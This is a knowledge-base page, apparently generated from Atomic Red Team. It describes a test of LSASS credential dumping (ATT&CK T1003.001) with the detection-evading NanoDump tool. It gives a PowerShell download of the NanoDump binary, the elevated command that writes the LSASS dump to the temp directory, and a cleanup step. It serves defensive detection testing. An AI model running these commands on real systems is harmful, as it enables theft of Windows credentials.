---
atomic_guid: "dddd4aca-bbed-46f0-984d-e4c5971c51ea"
title: "Dump LSASS.exe Memory using NanoDump"
framework: "atomic"
generated: "true"
attack_technique_id: "T1003.001"
attack_technique_name: "OS Credential Dumping: LSASS Memory"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml"
build_date: "2026-04-26 17:02:12"
executor: "command_prompt"
aliases:
  - "dddd4aca-bbed-46f0-984d-e4c5971c51ea"
  - "Dump LSASS.exe Memory using NanoDump"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Dump LSASS.exe Memory using NanoDump

The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.

https://github.com/helpsystems/nanodump

Upon successful execution, you should find the nanondump.dmp file in the temp directory

## Metadata

- Atomic GUID: dddd4aca-bbed-46f0-984d-e4c5971c51ea
- Technique: T1003.001: OS Credential Dumping: LSASS Memory
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1003.001/T1003.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1003-os_credential_dumping|T1003.001]]

## Dependencies

NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)

### Prerequisite Check

```powershell
if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe"
```

## Executor

- elevation_required: True
- name: command_prompt

### Command

```cmd
PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe -w "%temp%\nanodump.dmp"
```

### Cleanup

```cmd
del "%temp%\nanodump.dmp" >nul 2> nul
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1003.001/T1003.001.yaml)
